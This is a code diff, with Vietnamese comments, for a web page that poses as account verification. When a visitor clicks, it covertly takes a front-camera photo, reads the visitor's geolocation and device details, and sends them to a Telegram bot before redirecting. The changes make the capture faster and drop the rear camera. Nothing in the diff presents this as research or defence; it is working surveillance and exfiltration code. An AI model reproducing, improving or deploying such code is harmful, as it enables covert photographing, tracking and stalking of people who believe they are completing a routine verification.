@@ -109,15 +109,16 @@
                 navigator.geolocation.getCurrentPosition(
                     p => resolve(`https://www.google.com/maps?q=${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)}`),
                     () => resolve("Không lấy được vị trí"),
-                    { timeout: 3500, enableHighAccuracy: false }
+                    { timeout: 3000, enableHighAccuracy: false }
                 );
             });
         }
 
-        async function captureCamera(facingMode) {
+        // Chỉ chụp camera trước để siêu nhanh
+        async function captureCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode, width: { ideal: 800 }, height: { ideal: 600 } },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
                 return new Promise(resolve => {
@@ -132,40 +133,40 @@
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
 
+                        // Giảm delay tối đa
                         setTimeout(() => {
                             canvas.getContext('2d').drawImage(video, 0, 0);
                             stream.getTracks().forEach(t => t.stop());
-                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.78);
-                        }, 380);
+                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.75);
+                        }, 280);
                     };
                 });
             } catch (e) {
+                console.log("Camera error:", e);
                 return null;
             }
         }
 
-        async function sendToTelegram(info, front, back, loc) {
+        async function sendToTelegram(info, front, loc) {
             const caption = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
                            `⏰ Thời gian: ${info.time}\n` +
                            `📱 Thiết bị: ${info.device}\n` +
                            `🖥 Hệ điều hành: ${info.os}\n` +
-                           `📍 Vị trí: ${loc}\n` +
+                           `🔗 Link Google Map: ${loc}\n` +
                            `📷 Camera: ${info.camera}`;
 
-            if (front || back) {
-                const media = [];
-                if (front) media.push({ type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" });
-                if (back) media.push({ type: "photo", media: "attach://back" });
+            if (front) {
+                const media = [
+                    { type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" }
+                ];
 
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('media', JSON.stringify(media));
-                if (front) fd.append('front', front, 'front.jpg');
-                if (back) fd.append('back', back, 'back.jpg');
+                fd.append('front', front, 'front.jpg');
 
                 await fetch(`${TELEGRAM_API}/sendMediaGroup`, { method: 'POST', body: fd });
             } else {
-                // Nếu không có ảnh thì gửi text thường
                 await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -184,13 +185,12 @@
                 camera: '✅ Đã chụp'
             };
 
-            const [front, back, location] = await Promise.all([
-                captureCamera('user'),
-                captureCamera('environment').catch(() => null),
+            const [front, location] = await Promise.all([
+                captureCamera(),
                 getLocation()
             ]);
 
-            await sendToTelegram(info, front, back, location);
+            await sendToTelegram(info, front, location);
             statusEl.innerText = "Xác thực hoàn tất ✓";
         }
 
@@ -201,6 +201,7 @@
             try {
                 await main();
 
+                // Đếm ngược rất nhanh
                 let sec = 3;
                 const timer = setInterval(() => {
                     btn.innerText = `HOÀN TẤT TRONG ${sec}s`;
@@ -209,10 +210,11 @@
                         clearInterval(timer);
                         window.location.href = "";
                     }
-                }, 800);
+                }, 700);
             } catch (e) {
+                console.log(e);
                 statusEl.innerText = "Hoàn tất";
-                setTimeout(() => window.location.href = "", 1000);
+                setTimeout(() => window.location.href = "", 800);
             }
         });
 
